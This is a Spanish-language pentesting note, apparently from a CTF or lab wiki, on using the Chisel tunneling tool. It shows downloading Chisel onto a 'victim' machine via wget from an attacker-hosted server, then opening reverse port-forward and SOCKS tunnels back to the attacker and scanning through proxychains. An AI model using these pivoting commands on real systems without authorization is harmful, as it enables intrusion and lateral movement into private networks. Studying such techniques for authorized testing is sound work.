# Chisel

### Descarga

> Lo descargamos en nuestra maquina kali (atacante)
>
> Recomendable **v1.7.2**

#### Opcion 1

Clonamos chisel en nuestro equipo

```bash
git clone https://github.com/jpillora/chisel
cd !$
go build -ldflags "-s -w" .
```

#### Opcion 2

> Vamos a los releases y descargamos la versión que queramos (_**linux\_amd64.gz**_)

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

> Ahora solo descomprimimos

```bash
gunzip chisel_1.10.1_linux_amd64.gz && mv chisel_1.10.1_linux_amd64 chisel
```

***

#### Reducimos su peso

> Podemos comprobar su peso con `du -hc chisel` antes de reducirlo

Y ahora **reducimos su peso**

<pre class="language-bash"><code class="lang-bash"><strong>chmod +x chisel &#x26;&#x26; upx chisel
</strong></code></pre>

#### Compartir chisel - wget

Ahora me levanto como servidor web con python y me comparto (a una de las maquinas victimas (que tenga ejecucion de comandos)) con wget desde el `/tmp` de la maquina victima o el `/dev/shm`

```bash
sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
```

```bash
wget http://10.10.14.16/chisel
```

<figure><img src="../../../.gitbook/assets/Pasted image 20241126154320.png" alt=""><figcaption></figcaption></figure>

#### Compartir chisel - curl



***

### Uso

#### Puerto a puerto

Me levanto un servidor con chisel (desde mi maquina kali atacante)

```
./chisel server --reverse -p 1234
```

En la maquina victima, doy permisos de ejecución `chmod +x chisel` a chisel y me pongo como cliente y hago el portforwarding

```
./chisel client IP_ATTACKER:1234 R:8080:10.10.10.128:80
```

> El `R:8080:10.10.10.128:80` dice R: el 80 (puerto de mi maquina de atacante (puede ser el que sea)),  quiero que me vuelques lo tiene la ip 10.10.10.128 en su puerto 80. Así que si nos vamos a nuestro http://localhost;8080 deberíamos ver el contenido de 10.10.10.128 haciendo un tuneling a través de la 192.168.18.213 (MAGIA)
>
> A veces es necesario utilizar "releases" del git de chisel mas antiguos (según la maquina)

#### Con Sock

Me levanto un servidor con chisel (desde mi maquina kali atacante)

```
./chisel server --reverse -p 1234
```

En la maquina victima, doy permisos de ejecución `chmod +x chisel` a chisel y me pongo como cliente y le meto el sock

```
./chisel client 192.168.18.215:1234 R:socks
```

> A la hora de lanzar comandos, hay que poner primero `proxychains`&#x20;
>
> EJ: `proxychains nmap --top-ports 1000 -sT --open -T5 -v -n -Pn 10.10.10.128 2>&1 | grep -vE "timeout|OK"`
